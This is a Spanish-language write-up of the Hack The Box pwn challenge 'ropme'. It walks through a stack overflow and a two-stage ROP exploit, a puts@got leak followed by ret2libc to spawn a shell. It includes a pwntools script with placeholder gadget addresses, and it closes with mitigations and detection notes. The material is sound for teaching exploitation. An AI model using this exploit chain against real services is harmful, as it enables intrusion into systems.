---
challenge: ropme
type: Pwn
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, rop, ret2libc, got-leak, pwntools]
---


# ropme — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

## TL;DR

- El binario lee la entrada en un buffer de pila sin comprobar la longitud: el desbordamiento llega hasta `RIP`.
- `checksec`: NX activo, sin canario y **sin PIE**, así que las direcciones del binario son fijas y el ataque es ROP.
- Etapa 1: `pop rdi; ret` → `puts@got` → `puts@plt` → `main`, para filtrar la dirección real de `puts` y calcular la base de libc.
- Etapa 2: con libc resuelta, `system("/bin/sh")` mediante `pop rdi; ret` y un `ret` de alineación.

## Enunciado y superficie

ELF de 64 bits que pide una cadena por entrada estándar y la guarda en un buffer local. No hay canario y el binario no es PIE; NX impide ejecutar shellcode en la pila. El objetivo es controlar `RIP` y encadenar ROP hasta una shell.

## Reconocimiento

```bash
file ropme; checksec --file=ropme
objdump -d ropme | grep -E "<(main|vuln|system|puts)>"
strings -a ropme | grep -E "/bin/sh|flag"
```

`checksec` devuelve el escenario exacto del reto: `Canary: ✘`, `NX: ✓`, `PIE: ✘`, `RelRO: Partial`. Sin PIE se puede usar `elf.got` y `elf.plt` tal cual; con NX no hay shellcode, solo cadenas de gadgets.

## Análisis del código

La función principal reserva un buffer pequeño y llama a la lectura con un tamaño mayor, sin comprobar el retorno. Al no haber canario, los bytes que sobran sobrescriben el RBP guardado y la dirección de retorno: el desbordamiento es directo y determinista.

## Explicación del fallo

El offset hasta `RIP` se mide con un patrón cíclico. En este binario el frame reserva 0x50 y la dirección de retorno queda a **72 bytes** del inicio del buffer, pero el valor se confirma siempre:

```bash
python3 -c "from pwn import *; print(cyclic(200))" > pat
./ropme < pat
dmesg | tail -3        # RIP = 0x616161...
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```

Con `gdb` + `pwndbg`: `pattern create 200` y `pattern offset $rsp` en el crash.

## Reproducción local

- Ejecutar el binario con la libc del reto (`ldd ./ropme`) y depurar el crash en `gdb`/`pwndbg`.
- Repetir el offset y el leak contra el servicio remoto antes de lanzar el exploit definitivo.

## Explotación

La cadena tiene dos etapas porque libc tiene ASLR: no se conoce la dirección de `system` hasta filtrar una.

1. **Leak**: `pop rdi; ret` → dirección de `puts@got` → `puts@plt` imprime el puntero real de `puts` en libc → `main` vuelve a pedir entrada.
2. **ret2libc**: `base_libc = puts_leak - libc.symbols['puts']`; después `pop rdi; ret` → `next(libc.search(b'/bin/sh'))` → `libc.symbols['system']`, con un `ret` extra para alinear la pila a 16 bytes.

```bash
ROPgadget --binary ropme | grep -E "pop rdi|: ret$"
objdump -d ropme | grep -E "<(puts|main)@plt>"
```

```python
from pwn import *
context.binary = elf = ELF('./ropme')
libc = ELF('./libc.so.6')          # la que entregue el reto
p = process('./ropme')             # o remote('<IP>', <PORT>)

pop_rdi = <POP_RDI>
ret     = <RET>

# etapa 1: filtrar puts@got y volver a main
p.sendline(flat({<offset>: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main']]}))
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# etapa 2: system('/bin/sh')
p.sendline(flat({<offset>: [ret, pop_rdi, next(libc.search(b'/bin/sh')), libc.symbols['system']]}))
p.interactive()
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **No PIE + NX** deja el camino claro: ROP con direcciones del binario fijas y sin shellcode.
- **`puts@got` es el leak canónico**: `puts@plt` imprime el contenido de su propia entrada GOT y revela la base de libc.
- **`SIGSEGV` antes de `ret`** → offset mal medido; repite el patrón cíclico.
- **`system` no ejecuta** → pila desalineada; añade un `ret` antes del `pop rdi` (fallo típico en `movaps`).
- **Funciona en local y no en remoto** → libc distinta; usa la que entrega el reto y recalcula con `libc.symbols`.
- **Build rota del reto**: hay writeups que documentan tener que restar 64 bytes al puntero de `/bin/sh` para obtener shell en remoto; verifícalo en `gdb` antes de asumirlo.

MITRE: T1203, T1059.

## Mitigaciones y detección

- Compilar con `-fstack-protector-strong` y PIE, y limitar la lectura al tamaño real del buffer (`fgets(buf, sizeof buf, stdin)`).
- Detección: crashes repetidos del proceso, patrones cíclicos en la entrada y retornos a `puts`/`system` fuera del flujo normal.

## Referencias

- [MITRE T1059](https://attack.mitre.org/techniques/T1059/)
- [MITRE T1203](https://attack.mitre.org/techniques/T1203/)
- [rop-stack](../../knowledge/pwn/rop-stack.md)
